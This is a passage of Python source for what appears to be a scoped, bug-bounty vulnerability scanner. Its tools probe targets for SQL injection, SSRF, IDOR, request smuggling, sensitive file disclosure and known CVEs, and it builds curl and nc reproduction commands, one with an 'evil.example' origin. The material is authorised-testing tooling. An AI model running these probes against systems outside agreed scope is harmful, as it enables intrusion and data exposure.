            _re.I,
        )
        candidates = []
        for m in url_re.finditer(body):
            url = m.group(0)[:300]
            if url not in candidates:
                candidates.append(url)
        # s3:// style
        for m in _re.finditer(r"s3://[A-Za-z0-9._/-]{3,120}", body):
            u = m.group(0)
            if u not in candidates:
                candidates.append(u)
        data = {
            "path": path, "status": resp.get("status"),
            "storage_urls": candidates[:20],
            "count": len(candidates),
            "note": "candidates from page content — verify manually / with program scope",
        }
        summary = (
            f"s3_or_storage_probe: {len(candidates)} storage URL(s)"
            if candidates else "s3_or_storage_probe: none found"
        )
        tr = ToolResult(not bool(resp.get("error")), oid, "s3_or_storage_probe", summary,
                        data=data, error=str(resp.get("error") or ""), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _subdomain_probe(self, args: dict) -> ToolResult:
        """DNS-resolve labels under the scope parent only (no brute of out-of-scope domains)."""
        import socket  # noqa: PLC0415

        oid = self._oid()
        # Parent domain from host (strip leading labels if host is already a subdomain)
        host = self.host.strip().lower().rstrip(".")
        # Scope parents
        parents = []
        for s in self.scope:
            s = str(s).strip().lower().rstrip(".")
            if s and not s.replace(".", "").isdigit():
                parents.append(s)
        if host and host not in parents:
            parents.append(host)
        parent = parents[0] if parents else host

        labels = args.get("labels") or args.get("subs") or [
            "www", "api", "admin", "dev", "staging", "test", "mail", "vpn",
            "portal", "app", "cdn", "static", "img", "auth", "sso",
        ]
        if not isinstance(labels, list):
            labels = ["www", "api", "admin"]
        results = []
        for lab in labels[:30]:
            lab = str(lab).strip().lower().strip(".")
            if not lab or any(c in lab for c in " /\\:@") or ".." in lab:
                continue
            # Only allow single label (no nested attacker-controlled multi-level freeform)
            if "." in lab:
                continue
            fqdn = f"{lab}.{parent}"
            # Must end with a scope parent
            if not any(fqdn == p or fqdn.endswith("." + p) for p in parents):
                continue
            try:
                infos = socket.getaddrinfo(fqdn, None)
                ips = sorted({i[4][0] for i in infos if i[4]})
                if ips:
                    results.append({"host": fqdn, "ips": ips[:8], "ok": True})
            except OSError:
                results.append({"host": fqdn, "ips": [], "ok": False})
        live = [r for r in results if r.get("ok")]
        data = {"parent": parent, "resolved": live, "checked": len(results)}
        summary = f"subdomain_probe: {len(live)}/{len(results)} resolve under {parent}"
        tr = ToolResult(True, oid, "subdomain_probe", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _ssh_banner_timing(self, args: dict) -> ToolResult:
        """SSH banner grab + multi-sample connect latency (safe_active, no auth)."""
        import socket  # noqa: PLC0415
        import statistics  # noqa: PLC0415

        oid = self._oid()
        port = san.safe_port(args.get("port"), 22)
        try:
            samples = int(args.get("samples") or 5)
        except (TypeError, ValueError):
            samples = 5
        samples = max(2, min(samples, 10))
        timeout = san.safe_timeout(args.get("timeout"), 4.0)
        times: list[float] = []
        banner = ""
        errors = 0
        for _ in range(samples):
            t0 = time.time()
            try:
                sock = socket.create_connection((self.host, port), timeout=timeout)
                try:
                    sock.settimeout(timeout)
                    data = sock.recv(256)
                    elapsed = (time.time() - t0) * 1000
                    times.append(elapsed)
                    if data and not banner:
                        banner = data.decode("utf-8", "replace").strip()[:200]
                finally:
                    sock.close()
            except OSError:
                errors += 1
        data: dict[str, Any] = {
            "port": port, "banner": banner, "samples": len(times), "errors": errors,
            "note": "connect+banner timing only — not a full user-enum exploit",
        }
        if times:
            data["mean_ms"] = round(statistics.mean(times), 2)
            data["stdev_ms"] = round(statistics.pstdev(times), 2) if len(times) > 1 else 0.0
            data["min_ms"] = round(min(times), 2)
            data["max_ms"] = round(max(times), 2)
        ok = bool(banner or times)
        summary = (
            f"ssh_banner_timing: {banner[:40]!r} mean={data.get('mean_ms')}ms n={len(times)}"
            if ok else f"ssh_banner_timing: no banner (errors={errors})"
        )
        tr = ToolResult(ok, oid, "ssh_banner_timing", summary, data=data,
                        error="" if ok else "connect failed", network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _ssl_cert_chain(self, args: dict) -> ToolResult:
        """Inspect leaf certificate subject/issuer/SAN/expiry (read-only TLS handshake)."""
        import ssl  # noqa: PLC0415
        import socket  # noqa: PLC0415

        oid = self._oid()
        port = san.safe_port(args.get("port"), 443)
        timeout = san.safe_timeout(args.get("timeout"), 6.0)
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.host, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    der = ssock.getpeercert(binary_form=True)
                    cipher = ssock.cipher()
                    version = ssock.version()
            data: dict[str, Any] = {
                "port": port,
                "tls_version": version,
                "cipher": cipher[0] if cipher else None,
                "der_len": len(der) if der else 0,
            }
            # Parse DER via cryptography if available; else report handshake-only.
            try:
                from cryptography import x509  # noqa: PLC0415
                from cryptography.hazmat.backends import default_backend  # noqa: PLC0415
                cert = x509.load_der_x509_certificate(der, default_backend())
                try:
                    # cryptography >= 42
                    cn = cert.subject.rfc4514_string()
                    issuer = cert.issuer.rfc4514_string()
                except Exception:
                    cn = str(cert.subject)
                    issuer = str(cert.issuer)
                sans: list[str] = []
                try:
                    ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                    sans = [str(n) for n in ext.value][:30]
                except Exception:
                    pass
                data.update({
                    "subject": cn[:300],
                    "issuer": issuer[:300],
                    "not_before": cert.not_valid_before_utc.isoformat()
                    if hasattr(cert, "not_valid_before_utc")
                    else str(cert.not_valid_before),
                    "not_after": cert.not_valid_after_utc.isoformat()
                    if hasattr(cert, "not_valid_after_utc")
                    else str(cert.not_valid_after),
                    "san": sans,
                    "serial": format(cert.serial_number, "x"),
                })
                summary = f"ssl_cert_chain :{port} subject={cn[:60]}"
            except ImportError:
                data["note"] = "cryptography not installed — handshake metadata only"
                summary = f"ssl_cert_chain :{port} handshake ok (no DER parse)"
            tr = ToolResult(True, oid, "ssl_cert_chain", summary, data=data, network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "ssl_cert_chain", f"ssl_cert_chain failed: {exc}",
                            error=str(exc)[:200], network=True)
        self.observations.append(tr.to_dict())
        return tr

    # ── Tier B tools ─────────────────────────────────────────────────────────

    def _cve_probe(self, args: dict) -> ToolResult:
        """Curated non-crash CVE/product probes — marker match only."""
        import re as _re  # noqa: PLC0415

        oid = self._oid()
        cve = str(args.get("cve_id") or args.get("cve") or args.get("id") or "").strip().lower()
        cve = cve.replace("_", "-")
        if cve.startswith("cve") and not cve.startswith("cve-"):
            cve = "cve-" + cve[3:].lstrip("-")
        spec = _CVE_SAFE_PROBES.get(cve)
        if spec is None:
            return ToolResult(
                False, oid, "cve_probe",
                f"unknown cve_probe id (allowed: {sorted(_CVE_SAFE_PROBES)})",
                error="unknown cve", network=False,
            )
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        hits: list[dict] = []
        # Special: SSH banner only
        if spec.get("ssh_banner"):
            import socket  # noqa: PLC0415
            try:
                sock = socket.create_connection((self.host, san.safe_port(args.get("port"), 22)), timeout=4.0)
                try:
                    sock.settimeout(4.0)
                    banner = sock.recv(256).decode("utf-8", "replace").strip()[:200]
                finally:
                    sock.close()
                markers = spec.get("banner_markers") or ()
                matched = [m for m in markers if m.lower() in banner.lower()]
                data = {
                    "cve_id": cve, "description": spec.get("description"),
                    "banner": banner, "matched_markers": matched,
                    "vulnerable_signal": bool(matched),
                    "note": "banner presence only — not proof of CVE-2018-15473",
                }
                summary = (
                    f"cve_probe {cve}: SSH banner match {matched}"
                    if matched else f"cve_probe {cve}: banner={banner[:40]!r}"
                )
                tr = ToolResult(True, oid, "cve_probe", summary, data=data, network=True)
                self.observations.append(tr.to_dict())
                return tr
            except OSError as exc:
                tr = ToolResult(False, oid, "cve_probe", f"cve_probe {cve}: {exc}",
                                error=str(exc)[:200], network=True)
                self.observations.append(tr.to_dict())
                return tr

        headers = dict(spec.get("headers") or {})
        body_markers = spec.get("body_markers") or ()
        header_markers = [h.lower() for h in (spec.get("header_markers") or ())]
        for path in (spec.get("paths") or ())[:6]:
            # Paths may contain encodings — still must start with /
            if not isinstance(path, str) or not path.startswith("/"):
                continue
            if len(path) > 512 or any(c in path for c in "\r\n"):
                continue
            resp = self._do_http("GET", path, headers, None, port, tls, 6.0)
            body = str(resp.get("body") or "")
            rh = {str(k).lower(): str(v) for k, v in (resp.get("headers") or {}).items()}
            matched_body = []
            for m in body_markers:
                if m.startswith("root:.*"):
                    if _re.search(m, body):
                        matched_body.append(m)
                elif m in body:
                    matched_body.append(m)
            matched_hdr = [h for h in header_markers if any(h in f"{k}:{v}".lower() for k, v in rh.items())]
            interesting = bool(matched_body or matched_hdr) or (
                resp.get("status") == 200 and body_markers and len(body) > 20
                and any(x in body.lower() for x in ("root:", "password", "propertysources"))
            )
            hits.append({
                "path": path, "status": resp.get("status"), "error": resp.get("error") or "",
                "matched_body": matched_body, "matched_headers": matched_hdr,
                "body_snip": body[:200],
            })
            if matched_body or matched_hdr:
                break
        signal = any(h.get("matched_body") or h.get("matched_headers") for h in hits)
        data = {
            "cve_id": cve, "description": spec.get("description"),
            "hits": hits, "vulnerable_signal": signal,
            "note": "curated safe marker probe — not a free-form exploit",
        }
        summary = (
            f"cve_probe {cve}: VULNERABLE SIGNAL" if signal
            else f"cve_probe {cve}: no marker ({len(hits)} path(s))"
        )
        tr = ToolResult(True, oid, "cve_probe", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _sqli_boolean(self, args: dict) -> ToolResult:
        """Fixed boolean SQLi payloads — differential body length/status only."""
        import hashlib  # noqa: PLC0415

        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "sqli_boolean", "invalid path", error="sanitize failed")
        param = str(args.get("param") or "id").strip()[:40] or "id"
        import re as _re  # noqa: PLC0415
        if not _re.match(r"^[A-Za-z0-9_.-]{1,40}$", param):
            return ToolResult(False, oid, "sqli_boolean", "invalid param", error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))

        def _req(val: str) -> dict:
            sep = "&" if "?" in path else "?"
            # encode minimally — keep quotes for SQLi shapes (path is query component)
            from urllib.parse import quote  # noqa: PLC0415
            p = f"{path}{sep}{param}={quote(val, safe='')}"
            r = self._do_http("GET", p, {}, None, port, tls, 6.0)
            body = str(r.get("body") or "")
            return {
                "status": r.get("status"), "len": len(body),
                "hash": hashlib.sha256(body.encode("utf-8", "replace")).hexdigest()[:16],
                "error": r.get("error") or "", "elapsed_ms": r.get("elapsed_ms"),
            }

        base = _req(_SQLI_BOOLEAN["baseline"])
        true_results = [_req(p) for p in _SQLI_BOOLEAN["true"][:3]]
        false_results = [_req(p) for p in _SQLI_BOOLEAN["false"][:3]]
        # Signal: a true-payload response differs from false-payload consistently
        # while baseline is stable.
        signal = False
        reasons = []
        for t, f in zip(true_results, false_results):
            if t.get("error") or f.get("error"):
                continue
            if t.get("hash") != f.get("hash") and t.get("status") == f.get("status"):
                # length delta meaningful
                if abs((t.get("len") or 0) - (f.get("len") or 0)) >= 8:
                    signal = True
                    reasons.append("true/false body length or hash differs")
                    break
            if t.get("status") != f.get("status") and t.get("status") and f.get("status"):
                signal = True
                reasons.append("true/false status differs")
                break
        data = {
            "param": param, "path": path,
            "baseline": base, "true": true_results, "false": false_results,
            "vulnerable_signal": signal, "reasons": reasons,
            "note": "fixed payload set only — not free-form SQL",
        }
        summary = (
            f"sqli_boolean: SIGNAL ({', '.join(reasons)})" if signal
            else "sqli_boolean: no differential"
        )
        tr = ToolResult(True, oid, "sqli_boolean", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _sqli_time(self, args: dict) -> ToolResult:
        """Fixed time-based SQLi payloads (3s) — compare to baseline RTT."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "sqli_time", "invalid path", error="sanitize failed")
        param = str(args.get("param") or "id").strip()[:40] or "id"
        import re as _re  # noqa: PLC0415
        if not _re.match(r"^[A-Za-z0-9_.-]{1,40}$", param):
            return ToolResult(False, oid, "sqli_time", "invalid param", error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        from urllib.parse import quote  # noqa: PLC0415

        def _req(val: str, timeout: float = 8.0) -> dict:
            sep = "&" if "?" in path else "?"
            p = f"{path}{sep}{param}={quote(val, safe='')}"
            r = self._do_http("GET", p, {}, None, port, tls, timeout)
            return {
                "status": r.get("status"), "elapsed_ms": float(r.get("elapsed_ms") or 0),
                "error": r.get("error") or "",
            }

        base = _req("1", timeout=5.0)
        base_ms = float(base.get("elapsed_ms") or 0)
        timed = []
        signal = False
        for payload in _SQLI_TIME[:3]:
            r = _req(payload, timeout=10.0)
            timed.append({"payload_kind": "sleep3", "elapsed_ms": r["elapsed_ms"],
                          "status": r["status"], "error": r["error"]})
            # ~3s sleep → expect >= 2500ms over baseline (avoid network jitter)
            if r["elapsed_ms"] >= base_ms + 2500 and not r["error"]:
                signal = True
                break
        data = {
            "param": param, "path": path, "baseline_ms": base_ms,
            "probes": timed, "vulnerable_signal": signal,
            "note": "fixed 3s sleep payloads only; slow networks may false-positive",
        }
        summary = (
            f"sqli_time: SIGNAL delay vs baseline {base_ms:.0f}ms"
            if signal else f"sqli_time: no delay signal (base={base_ms:.0f}ms)"
        )
        tr = ToolResult(True, oid, "sqli_time", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _ssrf_canary(self, args: dict) -> ToolResult:
        """Inject http://canary_host into a param — observe reflection / error (OOB is operator-side)."""
        import re as _re  # noqa: PLC0415
        from urllib.parse import quote  # noqa: PLC0415

        oid = self._oid()
        canary = str(args.get("canary_host") or args.get("canary") or "").strip().lower()
        # Hostname only — no schemes, paths, or credentials
        if not canary or not _re.match(r"^[a-z0-9]([a-z0-9.-]{0,240}[a-z0-9])?$", canary):
            return ToolResult(
                False, oid, "ssrf_canary",
                "canary_host required (hostname you control, e.g. xyz.burpcollaborator.net)",
                error="missing canary", network=False,
            )
        # If canary is a literal private IP, reject (hostnames like oastify.com are OK)
        from src.ip_scope import is_private_or_local  # noqa: PLC0415
        import ipaddress  # noqa: PLC0415
        try:
            ipaddress.ip_address(canary)
            if is_private_or_local(canary):
                return ToolResult(False, oid, "ssrf_canary", "canary_host must not be private IP",
                                  error="private canary", network=False)
        except ValueError:
            pass  # hostname — fine
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "ssrf_canary", "invalid path", error="sanitize failed")
        param = str(args.get("param") or "url").strip()[:40] or "url"
        if not _re.match(r"^[A-Za-z0-9_.-]{1,40}$", param):
            return ToolResult(False, oid, "ssrf_canary", "invalid param", error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        target_url = f"http://{canary}/netlogic-ssrf-probe"
        sep = "&" if "?" in path else "?"
        probe_path = f"{path}{sep}{param}={quote(target_url, safe='')}"
        resp = self._do_http("GET", probe_path, {}, None, port, tls, 8.0)
        body = str(resp.get("body") or "")
        hdrs = {str(k).lower(): str(v) for k, v in (resp.get("headers") or {}).items()}
        # In-band signals only (true OOB needs operator collaborator logs)
        in_band = canary in body or canary in str(hdrs)
        data = {
            "canary_host": canary, "param": param, "injected": target_url,
            "status": resp.get("status"), "error": resp.get("error") or "",
            "in_band_canary_echo": in_band,
            "location": (hdrs.get("location") or "")[:300],
            "body_snip": body[:300],
            "elapsed_ms": resp.get("elapsed_ms"),
            "note": "Check your OOB collaborator for hits; in-band echo alone is weak evidence",
        }
        summary = (
            f"ssrf_canary: in-band echo of {canary}" if in_band
            else f"ssrf_canary: injected {canary} status={resp.get('status')} (check OOB)"
        )
        tr = ToolResult(not bool(resp.get("error")), oid, "ssrf_canary", summary,
                        data=data, error=str(resp.get("error") or ""), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _idor_diff(self, args: dict) -> ToolResult:
        """Compare same path under two scanner-side cookie sets (session A vs B)."""
        import hashlib  # noqa: PLC0415

        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "idor_diff", "invalid path", error="sanitize failed")
        ca = san.safe_cookies(args.get("cookies_a") or args.get("session_a"))
        cb = san.safe_cookies(args.get("cookies_b") or args.get("session_b"))
        if ca is None or cb is None:
            return ToolResult(False, oid, "idor_diff", "cookies_a/cookies_b must be objects",
                              error="sanitize failed", network=False)
        if not ca or not cb:
            return ToolResult(
                False, oid, "idor_diff",
                "need both cookies_a and cookies_b (two sessions)",
                error="missing sessions", network=False,
            )
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))

        def _with_cookies(cookies: dict) -> dict:
            # Temporarily overlay cookies without clobbering permanent session permanently
            prev = dict(self._session_cookies)
            try:
                self._session_cookies = dict(cookies)
                return self._do_http("GET", path, {}, None, port, tls, 6.0)
            finally:
                self._session_cookies = prev

        ra = _with_cookies(ca)
        rb = _with_cookies(cb)
        ba, bb = str(ra.get("body") or ""), str(rb.get("body") or "")
        ha = hashlib.sha256(ba.encode("utf-8", "replace")).hexdigest()[:16]
        hb = hashlib.sha256(bb.encode("utf-8", "replace")).hexdigest()[:16]
        both_ok = ra.get("status") == 200 and rb.get("status") == 200
        different = ha != hb and both_ok
        # Weak signal if one authorized one forbidden
        authz_diff = (
            ra.get("status") in (200, 206) and rb.get("status") in (401, 403)
        ) or (
            rb.get("status") in (200, 206) and ra.get("status") in (401, 403)
        )
        signal = different or authz_diff
        data = {
            "path": path,
            "a": {"status": ra.get("status"), "len": len(ba), "hash": ha, "error": ra.get("error") or ""},
            "b": {"status": rb.get("status"), "len": len(bb), "hash": hb, "error": rb.get("error") or ""},
            "body_diff": different, "authz_diff": authz_diff,
            "vulnerable_signal": signal,
            "note": "same path, two sessions — manual review for true IDOR",
        }
        summary = (
            f"idor_diff: SIGNAL path={path} (body_diff={different} authz_diff={authz_diff})"
            if signal else f"idor_diff: no difference on {path}"
        )
        tr = ToolResult(True, oid, "idor_diff", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _file_disclosure(self, args: dict) -> ToolResult:
        """GET fixed sensitive paths; confirm via content markers (not status alone)."""
        oid = self._oid()
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        try:
            max_paths = int(args.get("max_paths") or 16)
        except (TypeError, ValueError):
            max_paths = 16
        max_paths = max(4, min(max_paths, len(_FILE_DISCLOSURE)))
        findings = []
        for path, markers in _FILE_DISCLOSURE[:max_paths]:
            resp = self._do_http("GET", path, {}, None, port, tls, 5.0)
            status = resp.get("status")
            body = str(resp.get("body") or "")
            if status not in (200, 206) or resp.get("error"):
                continue
            # Avoid treating soft-404 HTML as disclosure
            if len(body) < 8:
                continue
            lower = body.lower()
            if any(x in lower for x in ("<!doctype html", "<html", "404 not found", "page not found")):
                # still allow if strong marker present (e.g. env in HTML error)
                if not any(m in body for m in markers):
                    continue
            hit_markers = [m for m in markers if m in body]
            if not hit_markers:
                continue
            findings.append({
                "path": path, "status": status, "markers": hit_markers,
                "body_snip": body[:180],
            })
        data = {
            "disclosures": findings, "count": len(findings),
            "note": "marker-confirmed only — soft-404 HTML ignored",
        }
        summary = (
            f"file_disclosure: {len(findings)} path(s) "
            f"({', '.join(f['path'] for f in findings[:4])})"
            if findings else "file_disclosure: none"
        )
        tr = ToolResult(True, oid, "file_disclosure", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _smuggling_desync(self, args: dict) -> ToolResult:
        """CL.TE observation probe — requires allow_crash_probes (proxy interference risk)."""
        oid = self._oid()
        if not self.allow_crash_probes:
            return ToolResult(
                False, oid, "smuggling_desync",
                "smuggling_desync disabled — set allow_crash_probes (intrusive / proxy risk)",
                error="not authorized", network=False,
            )
        path = san.safe_path(args.get("path") or "/") or "/"
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        # Single carefully formed request: contradictory CL/TE. Observe timeout/400/weird length.
        # Not a full desync exploit chain.
        from src.verifier.runner import _tcp_send_recv  # noqa: PLC0415
        host = self.host
        # TE.CL-ish: Transfer-Encoding: chunked with Content-Length
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode("ascii", errors="replace")
        t0 = time.time()
        raw, elapsed, err = _tcp_send_recv(host, port, req, timeout=6.0, use_tls=tls)
        body = (raw or b"").decode("utf-8", "replace")[:500]
        status = None
        if raw and raw.startswith(b"HTTP/"):
            try:
                status = int(raw.split(b" ", 2)[1])
            except Exception:
                status = None
        # Heuristic signals only
        signals = []
        if err and "timeout" in err.lower():
            signals.append("timeout")
        if status in (400, 500, 502):
            signals.append(f"status_{status}")
        if elapsed and elapsed > 4000:
            signals.append("slow_response")
        data = {
            "path": path, "status": status, "elapsed_ms": elapsed, "error": err or "",
            "signals": signals, "body_snip": body[:200],
            "note": "CL/TE contradiction observation only — not a confirmed desync exploit",
            "vulnerable_signal": bool(signals),
        }
        summary = (
            f"smuggling_desync: SIGNAL {signals}" if signals
            else f"smuggling_desync: no anomaly status={status}"
        )
        tr = ToolResult(True, oid, "smuggling_desync", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    # ── Tier D tools (bookkeeping / HackerOne readiness) ─────────────────────

    def _obs_by_id(self, oid: str) -> dict | None:
        for o in self.observations:
            if o.get("observation_id") == oid:
                return o
        return None

    def _curl_from_observation(self, obs: dict) -> str:
        """Best-effort curl reproduction from a tool observation."""
        tool = str(obs.get("tool") or "")
        data = obs.get("data") if isinstance(obs.get("data"), dict) else {}
        scheme = "https" if self.tls else "http"
        base = f"{scheme}://{self.host}"
        if self.port not in (80, 443, 0):
            base = f"{scheme}://{self.host}:{self.port}"

        if tool in ("http_request", "http_proof", "param_reflect", "cors_probe",
                    "graphql_introspect", "ssrf_canary", "file_disclosure", "cve_probe",
                    "api_discover"):
            # Prefer explicit path fields
            path = data.get("path") or "/"
            if tool == "param_reflect":
                param = data.get("param") or "q"
                marker = data.get("marker") or "nlprobe"
                path = f"/?{param}={marker}"
            if tool == "ssrf_canary":
                param = data.get("param") or "url"
                injected = data.get("injected") or ""
                path = f"/?{param}={injected}"
            method = "POST" if tool == "graphql_introspect" or data.get("body_template") else "GET"
            if data.get("body_template"):
                method = "POST"
            if tool == "http_proof":
                method = str(data.get("method") or "GET").upper()
            parts = [f"curl -sk -X {method}"]
            if tool == "cors_probe":
                origin = data.get("origin_sent") or "https://evil.example"
                parts.append(f"-H 'Origin: {origin}'")
            if tool == "graphql_introspect":
                parts.append("-H 'Content-Type: application/json'")
                parts.append("-d '{\"query\":\"{ __typename }\"}'")
            if tool == "http_proof" and data.get("body_sent"):
                parts.append("-H 'Content-Type: application/json'")
                body_esc = str(data["body_sent"]).replace("'", "'\\''")
                parts.append(f"-d '{body_esc}'")
            # Path may already include query
            url_path = path if str(path).startswith("/") else f"/{path}"
            # For cve_probe use first hit path
            if tool == "cve_probe" and data.get("hits"):
                url_path = data["hits"][0].get("path") or url_path
            if tool == "file_disclosure" and data.get("disclosures"):
                url_path = data["disclosures"][0].get("path") or url_path
            parts.append(f"'{base}{url_path}'")
            if self._session_cookies:
                cookie = "; ".join(f"{k}={v}" for k, v in list(self._session_cookies.items())[:6])
                parts.insert(1, f"-H 'Cookie: {cookie}'")
            return " ".join(parts)

        if tool == "ssh_banner_timing":
            port = data.get("port") or 22
            return f"nc -v {self.host} {port}   # expect SSH banner: {(data.get('banner') or '')[:60]!r}"

        if tool == "ssl_cert_chain":
            port = data.get("port") or 443
            return f"openssl s_client -connect {self.host}:{port} -servername {self.host} </dev/null"

        if tool in ("sqli_boolean", "sqli_time"):
            param = data.get("param") or "id"
            path = data.get("path") or "/"
            return f"curl -sk '{base}{path}?{param}=1'   # compare with true/false or sleep payloads (engine catalog)"

        if tool == "idor_diff":
            path = data.get("path") or "/"
            return (
                f"# Session A vs B on same path\n"
                f"curl -sk '{base}{path}' -H 'Cookie: <session_a>'\n"
                f"curl -sk '{base}{path}' -H 'Cookie: <session_b>'"
            )

        if tool == "ssdp_discover":
            return f"# Unicast SSDP to target only\n# replies must source from {self.host}"

        # Fallback: summary
        return f"# Reproduce via tool={tool} obs={obs.get('observation_id')}: {obs.get('summary')}"

    def _record_poc(self, args: dict) -> ToolResult:
        """Attach a curl/operator PoC to a finding from an observation id."""
        oid = self._oid()
        obs_id = str(args.get("observation_id") or args.get("obs") or "").strip()
        # Default: latest network observation
        obs = self._obs_by_id(obs_id) if obs_id else None
        if obs is None:
            for o in reversed(self.observations):
                if o.get("network") or o.get("tool") in (
                    "http_request", "param_reflect", "cors_probe", "cve_probe",
                    "file_disclosure", "sqli_boolean", "sqli_time", "ssrf_canary",
                    "graphql_introspect", "idor_diff", "ssh_banner_timing", "ssl_cert_chain",
                ):
                    obs = o
                    obs_id = str(o.get("observation_id") or "")
                    break
        if obs is None:
            return ToolResult(False, oid, "record_poc", "no observation to build PoC from",
                              error="no observation", network=False)

        finding_id = str(args.get("finding_id") or args.get("id") or "").strip()
        title = str(args.get("title") or args.get("summary") or obs.get("summary") or "")[:200]
        notes = str(args.get("notes") or "")[:400]
        curl = self._curl_from_observation(obs)
        expected = str(args.get("expected") or "")[:300]
        if not expected:
            data = obs.get("data") if isinstance(obs.get("data"), dict) else {}
            if data.get("vulnerable_signal"):
                expected = "Vulnerable signal / marker present (see observation data)"
            elif data.get("open_redirect_signal"):
                expected = (
                    "Location host is attacker-controlled (external). "
                    f"Observed: {(data.get('location') or '')[:160]}"
                )
            elif data.get("observed_summary"):
                expected = str(data.get("observed_summary"))[:300]
            elif data.get("schema_leak"):
                expected = "GraphQL __schema present in response"
            elif data.get("misconfig_signal"):
                expected = "CORS misconfiguration headers present"
            else:
                expected = f"Match observation summary: {obs.get('summary')}"

        poc = {
            "id": f"poc_{len(self.pocs)+1}",
            "finding_id": finding_id or None,
            "title": title,
            "observation_id": obs_id,
            "tool": obs.get("tool"),
            "curl": curl,
            "expected": expected,
            "notes": notes,
            "host": self.host,
            "in_scope": True,  # refined by scope_check if run
        }
        # Upsert by finding_id if present
        if finding_id:
            self.pocs = [p for p in self.pocs if p.get("finding_id") != finding_id] + [poc]
        else:
            self.pocs.append(poc)
        # Attach to finding if id matches
        if finding_id:
            for f in self.findings:
                if str(f.get("id") or "") == finding_id or str(f.get("raw_id") or "") == finding_id:
                    f["poc"] = {"curl": curl, "expected": expected, "observation_id": obs_id}
                    break
        tr = ToolResult(
            True, oid, "record_poc",
            f"PoC recorded for {finding_id or obs_id}: {curl[:80]}…",
            data=poc, network=False,
        )
        self.observations.append(tr.to_dict())
        return tr

    def _scope_check(self, args: dict) -> ToolResult:
        """Check whether host/path is inside the current scan scope."""
        oid = self._oid()
        host = str(args.get("host") or self.host).strip().lower().rstrip(".")
        path = str(args.get("path") or "/").strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        scope = [str(s).strip().lower().rstrip(".") for s in self.scope if s]
        if not scope:
            scope = [self.host.lower().rstrip(".")]

        def _host_in_scope(h: str) -> bool:
            for s in scope:
                if not s:
                    continue
                if h == s or h.endswith("." + s) or s.endswith("." + h):
                    return True
                # wildcard style *.example.com stored as example.com
                if s.startswith("*.") and (h == s[2:] or h.endswith("." + s[2:])):
                    return True
            return False

        host_ok = _host_in_scope(host)
        # Path denylist common OOS patterns (operator can still override by scope design)
        oos_prefixes = ("/logout", "/signout")  # mild; not a full program policy engine
        path_ok = not any(path.startswith(p) for p in oos_prefixes)
        in_scope = host_ok and path_ok
        data = {
            "host": host, "path": path, "scope": scope,
            "host_in_scope": host_ok, "path_ok": path_ok, "in_scope": in_scope,
            "note": "scope = scan targets list; program policy may be stricter",
        }
        summary = (
            f"scope_check: IN SCOPE {host}{path}" if in_scope
            else f"scope_check: OUT OF SCOPE host_ok={host_ok} path_ok={path_ok}"
        )
        tr = ToolResult(True, oid, "scope_check", summary, data=data, network=False)
        self.observations.append(tr.to_dict())
        return tr

    def _severity_suggest(self, args: dict) -> ToolResult:
        """HackerOne-aligned severity suggestion from class / finding metadata."""
        oid = self._oid()
        finding_id = str(args.get("finding_id") or args.get("id") or "").strip()
        title = str(args.get("title") or "").lower()
        klass = str(args.get("class") or args.get("kind") or "").lower()
        status = str(args.get("status") or "").lower()
        has_poc = bool(args.get("has_poc"))
        finding = None
        if finding_id:
            for f in self.findings:
                if str(f.get("id") or "") == finding_id or str(f.get("raw_id") or "") == finding_id:
                    finding = f
                    break
            if finding:
                title = title or str(finding.get("title") or "").lower()
                status = status or str(finding.get("status") or "").lower()
                has_poc = has_poc or bool(finding.get("poc")) or any(
                    p.get("finding_id") == finding_id for p in self.pocs
                )

        blob = f"{klass} {title} {finding_id}".lower()
        # Rubric (conservative — prefer under-claim)
        severity = "info"
        reason = "default inventory / weak signal"
        if any(k in blob for k in ("rce", "remote code", "http.sys", "deserial")):
            severity = "critical" if status == "confirmed" and has_poc else "high"
            reason = "RCE-class — critical only with confirmed + PoC"
        elif any(k in blob for k in ("sqli", "sql injection", "ssrf")):
            severity = "high" if status == "confirmed" else "medium"
            reason = "injection/SSRF — high when confirmed"
        elif any(k in blob for k in ("idor", "bola", "auth bypass", "account takeover")):
            severity = "high" if status == "confirmed" else "medium"
            reason = "access-control impact"
        elif any(k in blob for k in ("xss", "open redirect", "redirect")):
            severity = "medium"
